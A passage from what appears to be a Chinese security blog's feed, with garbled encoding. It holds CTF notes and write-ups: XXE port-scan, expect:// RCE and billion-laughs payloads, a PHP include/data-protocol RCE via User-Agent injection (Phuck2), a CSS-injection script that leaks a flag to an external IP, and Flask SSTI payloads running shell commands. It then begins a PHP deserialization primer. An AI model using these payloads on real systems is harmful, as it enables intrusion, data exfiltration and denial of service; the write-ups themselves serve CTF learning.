timeout&#x3D;5).text</span><br><span class="line">    coded_string &#x3D; x.split(&#39; &#39;)[-2] # a little split to get only the base64 encoded value</span><br><span class="line">    print coded_string</span><br><span class="line">#   print base64.b64decode(coded_string)</span><br><span class="line">for i in range(1, 255):</span><br><span class="line">    try:</span><br><span class="line">        i &#x3D; str(i)</span><br><span class="line">        ip &#x3D; &#39;10.0.0.&#39; + i</span><br><span class="line">        string &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;&#39; + ip + &#39;&#x2F;&#39;</span><br><span class="line">        print string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    except:</span><br><span class="line">continue</span><br></pre></td></tr></table></figure>
<h3 id="4ã€HTTP-å†…ç½‘ä¸»æœºç«¯å£æ‰«æ"><a href="#4ã€HTTP-å†…ç½‘ä¸»æœºç«¯å£æ‰«æ" class="headerlink" title="4ã€HTTP å†…ç½‘ä¸»æœºç«¯å£æ‰«æ"></a>4ã€HTTP å†…ç½‘ä¸»æœºç«¯å£æ‰«æ</h3><p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:515&#x2F;&quot; [  </span><br><span class="line">&lt;!ELEMENT data (#PCDATA)&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;&#x2F;data&gt;</span><br></pre></td></tr></table></figure>
<h3 id="5ã€å†…ç½‘ç›²æ³¨-CTF"><a href="#5ã€å†…ç½‘ç›²æ³¨-CTF" class="headerlink" title="5ã€å†…ç½‘ç›²æ³¨(CTF)"></a>5ã€å†…ç½‘ç›²æ³¨(CTF)</h3><p>2018 å¼ºç½‘æ¯ Wechat</p>
<p><a href="https://www.anquanke.com/post/id/103213#h2-5">2018 å¼ºç½‘æ¯ WP</a></p>
<h3 id="6ã€æ–‡ä»¶ä¸Šä¼ "><a href="#6ã€æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="6ã€æ–‡ä»¶ä¸Šä¼ "></a>6ã€æ–‡ä»¶ä¸Šä¼ </h3><p>Java <code>jar://</code>åè®®ç›¸å…³ï¼Œè‡ªè¡ŒæŸ¥çœ‹Reference</p>
<h3 id="7ã€é’“é±¼ï¼š"><a href="#7ã€é’“é±¼ï¼š" class="headerlink" title="7ã€é’“é±¼ï¼š"></a>7ã€é’“é±¼ï¼š</h3><p>åˆ©ç”¨ftpåè®®ç»“åˆCRLFæ³¨å…¥å‘SMTPæœåŠ¡å™¨å‘é€ä»»æ„å‘½ä»¤è¾¾åˆ°å‘é€ä»»æ„é‚®ä»¶çš„ç»™ä»»æ„äººï¼Œè¯¦æƒ…æŸ¥çœ‹Reference</p>
<h3 id="8ã€å…¶ä»–"><a href="#8ã€å…¶ä»–" class="headerlink" title="8ã€å…¶ä»–"></a>8ã€å…¶ä»–</h3><h4 id="1-PHP-expect-RCE"><a href="#1-PHP-expect-RCE" class="headerlink" title="1.PHP expect RCE"></a><strong>1.PHP expect RCE</strong></h4><p>ç”±äº PHP çš„ expect å¹¶ä¸æ˜¯é»˜è®¤å®‰è£…æ‰©å±•ï¼Œå¦‚æœå®‰è£…äº†è¿™ä¸ªexpect æ‰©å±•æˆ‘ä»¬å°±èƒ½ç›´æ¥åˆ©ç”¨ XXE è¿›è¡Œ RCE</p>
<p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect:&#x2F;&#x2F;id&quot;&gt;]&gt;</span><br><span class="line">&lt;dir&gt;</span><br><span class="line">&lt;file&gt;&amp;cmd;&lt;&#x2F;file&gt;</span><br><span class="line">&lt;&#x2F;dir&gt;</span><br></pre></td></tr></table></figure>
<h4 id="2-åˆ©ç”¨-XXE-è¿›è¡Œ-DOS-æ”»å‡»"><a href="#2-åˆ©ç”¨-XXE-è¿›è¡Œ-DOS-æ”»å‡»" class="headerlink" title="2. åˆ©ç”¨ XXE è¿›è¡Œ DOS æ”»å‡»"></a><strong>2. åˆ©ç”¨ XXE è¿›è¡Œ DOS æ”»å‡»</strong></h4><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">     &lt;!DOCTYPE lolz [</span><br><span class="line">     &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">     ]&gt;</span><br><span class="line">     &lt;lolz&gt;&amp;lol9;&lt;&#x2F;lolz&gt;</span><br></pre></td></tr></table></figure>
<h2 id="0x05æ€»ç»“"><a href="#0x05æ€»ç»“" class="headerlink" title="0x05æ€»ç»“"></a>0x05æ€»ç»“</h2><p>XXEåœ¨ctfæ¯”èµ›ä¸­ä¹Ÿç®—æ¯”è¾ƒå¸¸è§ï¼Œæœ€è¿‘åšé¢˜ç¢°åˆ°å¾ˆå¤šçš„xxeçš„é¢˜ç›®ï¼Œå¤§å¤šé¢˜ç›®éš¾åº¦æ¯”è¾ƒé€‚ä¸­ï¼Œè®°å½•ç³»ç»Ÿå­¦ä¹ ä¸€ä¸‹</p>
<h2 id="0x06Reference"><a href="#0x06Reference" class="headerlink" title="0x06Reference"></a>0x06Reference</h2><p><a href="https://xz.aliyun.com/t/3357#toc-24">ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£æ¼æ´ä¹‹ XXE æ¼æ´</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>XXE</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>Phuck2</title>
    <url>/2020/04/17/CTF_WP/Phuck2/</url>
    <content><![CDATA[<h1 id="Phuck2"><a href="#Phuck2" class="headerlink" title="Phuck2"></a>Phuck2</h1><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>æŸ¥çœ‹wpçš„æºä»£ç çš„å‘ç°ä¼ å…¥å‚æ•°hlå¯ä»¥å¾—åˆ°æºç </p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    stream_wrapper_unregister(&#39;php&#39;);</span><br><span class="line">    if(isset($_GET[&#39;hl&#39;])) highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">    $mkdir &#x3D; function($dir) &#123;</span><br><span class="line">        system(&#39;mkdir -- &#39;.escapeshellarg($dir));</span><br><span class="line">    &#125;;</span><br><span class="line">    $randFolder &#x3D; bin2hex(random_bytes(16));</span><br><span class="line">    $mkdir(&#39;users&#x2F;&#39;.$randFolder);</span><br><span class="line">    chdir(&#39;users&#x2F;&#39;.$randFolder);</span><br><span class="line"></span><br><span class="line">    $userFolder &#x3D; (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]) ? $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] : $_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">    $userFolder &#x3D; basename(str_replace([&#39;.&#39;,&#39;-&#39;],[&#39;&#39;,&#39;&#39;],$userFolder));</span><br><span class="line"></span><br><span class="line">    $mkdir($userFolder);</span><br><span class="line">    chdir($userFolder);</span><br><span class="line">    file_put_contents(&#39;profile&#39;,print_r($_SERVER,true));</span><br><span class="line">    chdir(&#39;..&#39;);</span><br><span class="line">    $_GET[&#39;page&#39;]&#x3D;str_replace(&#39;.&#39;,&#39;&#39;,$_GET[&#39;page&#39;]);</span><br><span class="line">    if(!stripos(file_get_contents($_GET[&#39;page&#39;]),&#39;&lt;?&#39;) &amp;&amp; !stripos(file_get_contents($_GET[&#39;page&#39;]),&#39;php&#39;)) &#123;</span><br><span class="line">        include($_GET[&#39;page&#39;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    chdir(__DIR__);</span><br><span class="line">    system(&#39;rm -rf users&#x2F;&#39;.$randFolder);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><code>$userFolder</code>åœ¨æœ‰<code>X-FORWARDED-FOR</code>å¤´æ˜¯ç”¨è¿™ä¸ªä½œä¸ºæ–‡ä»¶å¤¹å</p>
<p>ä¼šæ‰“å°<code>$_SERVER</code>ä¼ å…¥profileæ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(!stripos(file_get_contents($_GET[&#39;page&#39;]),&#39;&lt;?&#39;) &amp;&amp; !stripos(file_get_contents($_GET[&#39;page&#39;]),&#39;php&#39;)) &#123;</span><br><span class="line">        include($_GET[&#39;page&#39;]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è€ƒè™‘åœ¨httpè¯·æ±‚å¤´ä¸­æ’å…¥phpä»£ç ,ç„¶ååŒ…å«profileæ–‡ä»¶è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<p>å½“<code>allow_url_include=Off</code>æ—¶</p>
<p>file_get_contentsåœ¨å¤„ç†data:xxxæ—¶ä¼šç›´æ¥å–xxx</p>
<p>è€Œincludeä¼šåŒ…å«æ–‡ä»¶åä¸ºdata:xxxçš„æ–‡ä»¶</p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;?page&#x3D;data:aa&#x2F;profile HTTP&#x2F;1.1</span><br><span class="line">X-Forwarded-For: data:aa</span><br><span class="line">User-Agent: &lt;?php system(&#39;ls &#x2F;&#39;); ?&gt;</span><br><span class="line">GET &#x2F;?page&#x3D;data:aa&#x2F;profile HTTP&#x2F;1.1</span><br><span class="line">X-Forwarded-For: data:aa</span><br><span class="line">User-Agent: &lt;?php system(&#39;&#x2F;get_flag&#39;);?&gt;</span><br></pre></td></tr></table></figure>
<p>åœ¨è¿”å›çš„æ•°æ®ä¸­æ‰¾åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[HTTP_USER_AGENT] &#x3D;&gt; flag&#123;asdsafasfdsadasd&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ctftime.org/writeup/12921">Phuck2wp</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
        <tag>phpä¼ªåè®®</tag>
        <tag>dataåè®®ä¸file_get_contentsä¸include</tag>
      </tags>
  </entry>
  <entry>
    <title>[å®‰æ´µæ¯ 2019]cssgame</title>
    <url>/2020/04/17/CTF_WP/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Dcssgame/</url>
    <content><![CDATA[<h1 id="å®‰æ´µæ¯-2019-cssgame"><a href="#å®‰æ´µæ¯-2019-cssgame" class="headerlink" title="[å®‰æ´µæ¯ 2019]cssgame"></a>[å®‰æ´µæ¯ 2019]cssgame</h1><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>å¾ˆæœ‰æ„æ€çš„CSS injection</p>
<p>å¤§è‡´çš„æ€è·¯å°±æ˜¯é€šè¿‡ä¼ å…¥ä¸€ä¸ªå¤–éƒ¨é“¾æ¥çš„css,è®©flag.htmlè§£æ,</p>
<p>å¤–éƒ¨é“¾æ¥çš„csså†™å…¥å¦‚ä¸‹å†…å®¹</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">input[name&#x3D;flag][value^&#x3D;&quot;f&quot;] ~ * &#123;background-image: url(&quot;http:&#x2F;&#x2F;x.x.x.x&#x2F;?flag&#x3D;f&quot;);&#125;</span><br></pre></td></tr></table></figure>
<p>ç„¶åå¯¹flagå€¼è¿›è¡Œé€ä½åˆ¤æ–­ï¼Œå¦‚æœæ­£ç¡®åˆ™å‘é€æ•°æ®ç»™vps</p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p><strong>exp</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&quot;poc.css&quot;, &quot;w&quot;)</span><br><span class="line">dic &#x3D; &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;-&quot;</span><br><span class="line">for i in dic:</span><br><span class="line">    flag &#x3D; sys.argv[1] + i</span><br><span class="line">    payload &#x3D; &quot;input[name&#x3D;flag][value^&#x3D;\&quot;&quot; + flag + &quot;\&quot;] ~ * &#123;background-image: url(\&quot;http:&#x2F;&#x2F;174.0.31.242:8080&#x2F;?&quot; + flag + &quot;\&quot;);&#125;&quot;</span><br><span class="line">    f.write(payload + &quot;\n&quot;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>åœ¨buuç”³è¯·ä¸€å°å°å·linux lab,ç„¶ååœ¨/var/www/html/ç›®å½•å†™å…¥ä»¥ä¸Šexp,è¿è¡Œä¸€ä¸‹è„šæœ¬,ncå¼€å¯ç›‘å¬</p>
<p>ç„¶åå°±å¼€å§‹å°†<code>css=http://174.0.31.242/poc.css</code>postç»™<code>crawl.html</code>,åœ¨ncç›‘å¬ä¸­å¯ä»¥å¾—åˆ°flag,ç„¶åæ‰‹åŠ¨æ”¹flagçš„å€¼,ç”Ÿæˆä¸åŒçš„poc.css,é€ä½çˆ†ç ´å¯ä»¥å¾—åˆ°flag</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200417/7xPSKY9xQYDl.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200417/7xPSKY9xQYDl.png?imageslim" alt="mark"></a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200417/pBpeVx5eKtNN.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200417/pBpeVx5eKtNN.png?imageslim" alt="mark"></a></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä»¥ä¸Šæ–¹æ³•è¿˜æ˜¯æœ‰ç‚¹éº»çƒ¦çš„ï¼Œçœ‹çœ‹å®˜æ–¹wpï¼Œå‘ç°æœ‰æ›´å¥½çš„åŠæ³•ï¼Œå­¦ä¸€æ‰‹ï¼ŒINS</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[<a href="https://nikoeurus.github.io/2019/11/30/2019%E5%AE%89%E8%AF%A2%E6%9D%AF-Web/#cssgame">å®‰æ´µæ¯ 2019]cssgame wp</a></p>
<p>[<a href="https://xz.aliyun.com/t/6911#toc-12">å®‰æ´µæ¯ 2019]cssgame å®˜æ–¹WP</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
        <tag>CSS injection</tag>
      </tags>
  </entry>
  <entry>
    <title>[CSCCTF 2019 Qual]FlaskLight</title>
    <url>/2020/04/15/CTF_WP/%5BCSCCTF%202019%20Qual%5DFlaskLight/</url>
    <content><![CDATA[<h1 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h1><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>é¢˜ç›®æ˜¯flaskï¼Œæ‰“å¼€æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°æç¤ºä¼ å‚searchï¼Œfuzzæµ‹è¯•</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;1*2&#125;&#125;</span><br><span class="line">#è¿”å›ç»“æœ2å¯ä»¥åˆ¤å®šæœ‰SSTI</span><br><span class="line">æŸ¥çœ‹&#123;&#123;config&#125;&#125;å‘ç°ä¸€äº›ä¿¡æ¯</span><br></pre></td></tr></table></figure>
<p>ç„¶åå°±æ˜¯å¸¸è§„çš„æ¨¡æ¿æ³¨å…¥</p>
<p>[Templates Injections](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server</a> Side Template Injection)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br><span class="line">#å¯ä»¥çˆ†å‡ºæ‰€æœ‰çš„ç±»</span><br></pre></td></tr></table></figure>
<p>å†™äº†ä¸€ä¸ªè„šæœ¬æŸ¥æ‰¾å¯ä»¥åˆ©ç”¨çš„ç±»</p>
<p>åˆ©ç”¨<code>subprocess.Popen</code>æ‰§è¡Œå‘½ä»¤,è¯¦æƒ…å‚è€ƒé“¾æ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import html</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">index &#x3D; 0</span><br><span class="line">for i in range(170, 1000):</span><br><span class="line">    try:</span><br><span class="line">        url &#x3D; &quot;http:&#x2F;&#x2F;5a8d97da-4cb0-43f8-9810-e9c352e034ad.node3.buuoj.cn&#x2F;?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[&quot; + str(i) + &quot;]&#125;&#125;&quot;</span><br><span class="line">        r &#x3D; requests.get(url)</span><br><span class="line">        res &#x3D; re.findall(&quot;&lt;h2&gt;You searched for:&lt;\&#x2F;h2&gt;\W+&lt;h3&gt;(.*)&lt;\&#x2F;h3&gt;&quot;, r.text)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        # print(res)</span><br><span class="line">        # print(r.text)</span><br><span class="line">        res &#x3D; html.unescape(res[0])</span><br><span class="line">        print(str(i) + &quot; | &quot; + res)</span><br><span class="line">        if &quot;subprocess.Popen&quot; in res:</span><br><span class="line">            index &#x3D; i</span><br><span class="line">            break</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br><span class="line">print(&quot;indexo of subprocess.Popen:&quot; + str(index))</span><br></pre></td></tr></table></figure>
<p>æ‰¾åˆ°ç±»åçš„indexä¹‹åå¾ˆç®€å•äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line"></span><br><span class="line">?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line"></span><br><span class="line">?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°flag</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
        <tag>FLaskSSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPååºåˆ—åŒ–</title>
    <url>/2020/04/14/CTF/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="PHPååºåˆ—åŒ–"><a href="#PHPååºåˆ—åŒ–" class="headerlink" title="PHPååºåˆ—åŒ–"></a>PHPååºåˆ—åŒ–</h1><h2 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h2><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php">PHPé­”æœ¯æ–¹æ³•</a></p>
<a id="more"></a>

<p>1ã€<code>__sleep()</code></p>
<ul>
<li><code>serialize()</code>å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• <code>__sleep()</code>ã€‚</li>
<li>å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚</li>
<li>å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ <strong>NULL</strong> è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª <strong>E_NOTICE</strong> çº§åˆ«çš„é”™è¯¯ã€‚</li>
</ul>
<p>2ã€<code>__wake()</code></p>
<ul>
<li><code>unserialize()</code>ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª <code>__wakeup()</code>æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ <em>__wakeup</em> æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚</li>
<li><code>__wakeup()</code>ç»å¸¸ç”¨åœ¨ååºåˆ—åŒ–æ“ä½œä¸­ï¼Œä¾‹å¦‚é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥ï¼Œæˆ–æ‰§è¡Œå…¶å®ƒåˆå§‹åŒ–æ“ä½œã€‚</li>
</ul>
<p>3ã€<code>__construct()</code></p>
<ul>
<li>PHP 5 å…è¡Œå¼€å‘è€…åœ¨ä¸€ä¸ªç±»ä¸­å®šä¹‰ä¸€ä¸ªæ–¹æ³•ä½œä¸ºæ„é€ å‡½æ•°ã€‚å…·æœ‰æ„é€ å‡½æ•°çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•ï¼Œæ‰€ä»¥éå¸¸é€‚åˆåœ¨ä½¿ç”¨å¯¹è±¡ä¹‹å‰åšä¸€äº›åˆå§‹åŒ–å·¥ä½œã€‚</li>
<li>å¦‚æœå­ç±»ä¸­å®šä¹‰äº†æ„é€ å‡½æ•°åˆ™ä¸ä¼šéšå¼è°ƒç”¨å…¶çˆ¶ç±»çš„æ„é€ å‡½æ•°ã€‚è¦æ‰§è¡Œçˆ¶ç±»çš„æ„é€ å‡½æ•°ï¼Œéœ€è¦åœ¨å­ç±»çš„æ„é€ å‡½æ•°ä¸­è°ƒç”¨ **parent::__construct()**ã€‚å¦‚æœå­ç±»æ²¡æœ‰å®šä¹‰æ„é€ å‡½æ•°åˆ™ä¼šå¦‚åŒä¸€ä¸ªæ™®é€šçš„ç±»æ–¹æ³•ä¸€æ ·ä»çˆ¶ç±»ç»§æ‰¿ï¼ˆå‡å¦‚æ²¡æœ‰è¢«å®šä¹‰ä¸º private çš„è¯ï¼‰ã€‚</li>
</ul>
<p>4ã€<code>__destruct ()</code></p>
<ul>
<li>PHP 5 å¼•å…¥äº†ææ„å‡½æ•°çš„æ¦‚å¿µï¼Œè¿™ç±»ä¼¼äºå…¶å®ƒé¢å‘å¯¹è±¡çš„è¯­è¨€ï¼Œå¦‚ C++ã€‚ææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œã€‚</li>
</ul>
<p>5ã€<code>__toString()</code></p>
<ul>
<li><a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.tostring">__toString()</a> æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ <em>echo $obj;</em> åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†å‘å‡ºä¸€æ¡ <strong>E_RECOVERABLE_ERROR</strong> çº§åˆ«çš„è‡´å‘½é”™è¯¯ã€‚</li>
<li>éœ€è¦æŒ‡å‡ºçš„æ˜¯åœ¨ PHP 5.2.0 ä¹‹å‰ï¼Œ<code>__toString()</code>æ–¹æ³•åªæœ‰åœ¨ç›´æ¥ä½¿ç”¨äº <code>echo</code> æˆ– <code>print</code> æ—¶æ‰èƒ½ç”Ÿæ•ˆã€‚</li>
<li>PHP 5.2.0 ä¹‹åï¼Œåˆ™å¯ä»¥åœ¨ä»»ä½•å­—ç¬¦ä¸²ç¯å¢ƒç”Ÿæ•ˆï¼ˆä¾‹å¦‚é€šè¿‡ <code>printf()</code>ï¼Œä½¿ç”¨ <em>%s</em> ä¿®é¥°ç¬¦ï¼‰ï¼Œä½†ä¸èƒ½ç”¨äºéå­—ç¬¦ä¸²ç¯å¢ƒï¼ˆå¦‚ä½¿ç”¨ <em>%d</em> ä¿®é¥°ç¬¦ï¼‰ã€‚</li>
<li>è‡ª PHP 5.2.0 èµ·ï¼Œå¦‚æœå°†ä¸€ä¸ªæœªå®šä¹‰ <code>__toString()</code> æ–¹æ³•çš„å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä¼šäº§ç”Ÿ <strong>E_RECOVERABLE_ERROR</strong> çº§åˆ«çš„é”™è¯¯ã€‚</li>
</ul>
<p>6ã€<code>__invoke()</code></p>
<ul>
<li><p>å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ<code>__invoke()</code>æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚</p>
</li>
<li><p>ç¤ºä¾‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class CallableClass </span><br><span class="line">&#123;</span><br><span class="line">    function __invoke($x) &#123;</span><br><span class="line">        var_dump($x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj &#x3D; new CallableClass;</span><br><span class="line">$obj(5);</span><br><span class="line">var_dump(is_callable($obj));</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;æ ·ä¾‹è¾“å‡º    </span><br><span class="line">int(5)</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure>
<p>7ã€<code>__call()</code>å’Œ<code>__callStatic()</code></p>
</li>
<li><p>æ–¹æ³•é‡è½½</p>
</li>
<li><p>åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ<code>__call()</code> ä¼šè¢«è°ƒç”¨</p>
</li>
